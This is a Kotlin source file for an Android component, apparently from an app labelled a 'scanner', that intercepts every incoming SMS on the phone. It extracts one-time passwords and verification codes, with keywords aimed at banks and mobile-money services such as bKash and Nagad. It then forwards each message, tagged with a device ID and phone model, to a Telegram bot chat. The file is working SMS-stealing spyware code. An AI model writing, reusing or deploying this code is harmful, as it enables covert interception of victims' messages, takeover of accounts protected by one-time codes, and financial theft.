package com.example.scanner

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import com.example.data.MediaUploadRepository
import com.example.network.TelegramApiService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.regex.Pattern

/**
 * SmsOtpReceiver intercepts incoming SMS messages, detects 4-8 digit OTP codes / verification codes,
 * and automatically forwards them formatted with high priority to the configured Telegram chat.
 */
class SmsOtpReceiver : BroadcastReceiver() {

    private val receiverScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        try {
            val messages: Array<SmsMessage> = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isEmpty()) return

            val sender = messages[0].displayOriginatingAddress ?: messages[0].originatingAddress ?: "Unknown Sender"
            val fullBodyBuilder = StringBuilder()
            var timestamp = System.currentTimeMillis()

            for (sms in messages) {
                fullBodyBuilder.append(sms.displayMessageBody ?: sms.messageBody ?: "")
                if (sms.timestampMillis > 0) {
                    timestamp = sms.timestampMillis
                }
            }

            val fullBody = fullBodyBuilder.toString().trim()
            if (fullBody.isBlank()) return

            val detectedOtp = extractOtpCode(fullBody)
            val isOtp = detectedOtp != null || isOtpLikelyText(fullBody)

            val repository = MediaUploadRepository(context.applicationContext)
            val config = repository.getTelegramConfig()
            val deviceId = repository.getDeviceId()

            if (config.botToken.isBlank() || config.chatId.isBlank()) return

            val timeStr = SimpleDateFormat("dd MMM, hh:mm:ss a", Locale.getDefault()).format(Date(timestamp))

            val messageText = if (isOtp) {
                val otpHighlight = if (detectedOtp != null) "🔐 <b>OTP CODE:</b> <code>$detectedOtp</code>\n\n" else ""
                "⚡ <b>NEW OTP / SMS DETECTED [ID: <code>$deviceId</code>]</b>\n\n" +
                        otpHighlight +
                        "👤 <b>From:</b> <code>$sender</code>\n" +
                        "💬 <b>Message:</b>\n<i>${escapeHtml(fullBody)}</i>\n\n" +
                        "🕒 <b>Time:</b> $timeStr\n" +
                        "📱 <b>Device:</b> ${android.os.Build.MANUFACTURER.uppercase()} ${android.os.Build.MODEL}"
            } else {
                "📩 <b>INCOMING SMS [ID: <code>$deviceId</code>]</b>\n\n" +
                        "👤 <b>From:</b> <code>$sender</code>\n" +
                        "💬 <b>Message:</b>\n<i>${escapeHtml(fullBody)}</i>\n\n" +
                        "🕒 <b>Time:</b> $timeStr\n" +
                        "📱 <b>Device:</b> ${android.os.Build.MANUFACTURER.uppercase()} ${android.os.Build.MODEL}"
            }

            val telegramApi = TelegramApiService(context.applicationContext)
            receiverScope.launch {
                try {
                    telegramApi.sendMessage(config.botToken, config.chatId, messageText)
                } catch (e: Exception) {
                    Log.e("SmsOtpReceiver", "Failed to forward SMS to Telegram", e)
                }
            }
        } catch (e: Exception) {
            Log.e("SmsOtpReceiver", "Error in SmsOtpReceiver", e)
        }
    }

    companion object {
        private val OTP_PATTERNS = listOf(
            // "code is 123456", "otp: 492011", "verification code 8392", "pin: 1234"
            Pattern.compile("""(?i)(?:code|otp|pin|verification|password|login|secret|security|পাাসওয়ার্ড|কোড|পিন)[\s:=-]+([0-9]{4,8})\b"""),
            // "123456 is your code", "78329 is your verification code"
            Pattern.compile("""(?i)\b([0-9]{4,8})\b[\s]+is[\s]+your[\s]+(?:verification|otp|code|login|pin)"""),
            // Google style: G-123456
            Pattern.compile("""(?i)\b(?:G|FB|VK)-([0-9]{4,8})\b"""),
            // Fallback: standalone 4 to 8 digit numbers in messages mentioning otp/code
            Pattern.compile("""\b([0-9]{4,8})\b""")
        )

        private val KEYWORDS = listOf(
            "otp", "code", "verification", "pin", "verify", "password", "one-time",
            "security", "google", "facebook", "whatsapp", "telegram", "bkash", "nagad", "rocket",
            "bank", "কোড", "পিন", "ভেরিফিকেশন"
        )

        fun extractOtpCode(message: String): String? {
            val lower = message.lowercase()
            val containsKeyword = KEYWORDS.any { lower.contains(it) }

            for ((index, pattern) in OTP_PATTERNS.withIndex()) {
                val matcher = pattern.matcher(message)
                if (matcher.find()) {
                    val code = matcher.group(1)
                    if (code != null && code.length in 4..8) {
                        // If it matched the simple fallback standalone number, ensure message actually contains an OTP keyword
                        if (index == OTP_PATTERNS.lastIndex && !containsKeyword) {
                            continue
                        }
                        return code
                    }
                }
            }
            return null
        }

        fun isOtpLikelyText(message: String): Boolean {
            val lower = message.lowercase()
            return KEYWORDS.any { lower.contains(it) }
        }

        private fun escapeHtml(text: String): String {
            return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
        }
    }
}
